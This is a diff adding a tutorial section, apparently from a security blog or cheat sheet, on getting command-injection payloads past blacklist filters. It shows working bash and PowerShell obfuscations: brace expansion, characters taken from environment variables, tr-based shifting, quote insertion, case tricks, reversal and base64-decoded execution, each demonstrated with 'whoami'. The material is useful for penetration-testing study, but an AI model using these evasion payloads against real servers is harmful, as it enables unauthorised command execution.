@@ -188,6 +188,113 @@ We may have to bypass several protections. We can replace some characters with t
 | Sub-Shell | \`\` | %60%60 | Both (Linux-only) |
 | Sub-Shell | $() | %24%28%29 | Both (Linux-only) |
 
+
+Instead of using spaces or tabs you can use ```Brace Expansion```. For example instead of using ```ls -la``` you can use ```{ls,-la}```.
+
+### Environment variables :
+
+#### Linux
+
+You can also select a character from the environment variables. For example, ```${PATH:0:1}``` will act like a ```/```. This will take the string beginning at the index ```0``` and take only ```1``` character of the ```PATH``` variable. The ```;``` can be replaced by ```${LS_COLORS:10:1}```
+
+> ```printenv``` can be used to print all the environment variables. With that you can customise your payload as you want.
+{: .prompt-tip}
+
+
+#### Windows
+
+As for the Linux example, we can do the same on a windows system. The ```%HOMEPATH:~x,y``` can be used in the same way where ```x``` and ```y``` are replaced by numbers.
+
+If you know that you are on a powershell terminal you can use it like this ```$env:HOMEPATH[0]```. To print all environment variables in powershell you can use ```Get-ChildItem Env:```.
+
+
+### Character Shifting
+
+We can also try to pass commands to shift from a character non blacklisted to the one we want. For example, the following example will shift from ```]``` to ```\``` because the  ```\``` is on 92 and on 91 is ```[```.``````
+
+```console
+$(tr '!-}' '"-~'<<<[)
+```
+
+> If you want to shift another character you can ```man ascii``` and look any character you want.
+{: .prompt-tip }
+
+> You can verify that your payload is correct by putting it on your terminal. For example, ```echo $(tr '!-}' '"-~'<<<\[)``` should return you the ```\``` character.
+{: .prompt-tip }
+
+### Quotes
+
+Inserting specific characters within our command that are typically ignored by command shells like Bash or PowerShell and will execute the same command as if they were not there is one very popular and simple obfuscation technique. These characters include several single-quotes, double-quotes, and a few others.
+You can see some examples below to execute the ```whoami``` command :
+
+```bash
+w'h'o'am'i  ⇔ w"h"o"am"i ⇔ whoami (linux+windows)
+who$@ami	⇔ w\ho\am\i ⇔ whoami (linux)
+who^ami	⇔ whoami (windows)
+```
+### Case Manipulation
+
+Depending on the OS the server is on, we can change the case of a command ant it will understand it.
+On windows for example,  we can change the command ```whoami``` to ```WhOaMi``` and the terminal will understand it the same.
+
+We can do the same in Linux, except that this time it's case sensitive. "But how can we do the same trick if Linux is case sensitive ?", well, we can use our word with upper and lower cases (non blacklisted) and replace all the upper cases by lower cases in one command like :
+
+```bash
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+```
+
+### Reverse String
+
+Same as upper and lower case, we can reverse a command so the server doesn't recognise it. 
+On Linux, we will revert our command with the following line :
+
+```bash
+echo 'whoami' | rev
+```
+
+We grab it and put it in our payload that we are going to send to the server. The payload looks like :
+
+```bash
+$(rev<<<'imaohw')
+```
+
+On a Windows machine, we would do the same in Powershell. First we need to revert the string :
+
+```bash
+"whoami"[-1..-20] -join ''
+```
+
+And then put it in the payload :
+
+```bash
+iex "$('imaohw'[-1..-20] -join '')"
+```
+### Encoding
+
+Same as before, we first create our modified command. Here we are going to base64 it.
+
+```bash
+echo -n 'whoami' | base64
+```
+
+Then we put it in our payload like this :
+
+```bash
+bash<<<$(base64 -d<<<d2hvYW1p)
+```
+
+On a Windows machine, we can do the same on Powershell :
+
+```bash
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+```
+
+And the final payload will be :
+
+```bash
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+```
+
 ## Evasion Tools
 
 We can use evasion tools so that they create us the strings we can directly use for command injections instead to create them manually.
